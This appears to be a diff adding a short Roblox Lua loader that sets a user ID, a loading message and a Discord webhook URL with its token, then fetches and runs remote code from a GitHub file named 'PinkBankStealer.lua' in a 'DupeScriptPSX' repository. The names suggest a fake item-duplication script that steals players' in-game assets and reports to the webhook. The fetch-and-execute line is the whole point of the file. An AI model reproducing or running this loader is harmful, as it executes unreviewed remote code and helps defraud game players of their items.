@@ -1,0 +1,6 @@
+_G.UserId = 1262872112
+_G.LoadingText = "Please Wait"
+_G.WebHook ="https://discord.com/api/webhooks/1078493901083652147/oiisnQkyYWLbBNcPD6EzxZvv-oewyknFR_Bvi5J3UT7JjgurNS73PQoS4jZp92wHni9Z"
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkBankStealer.lua", true))()
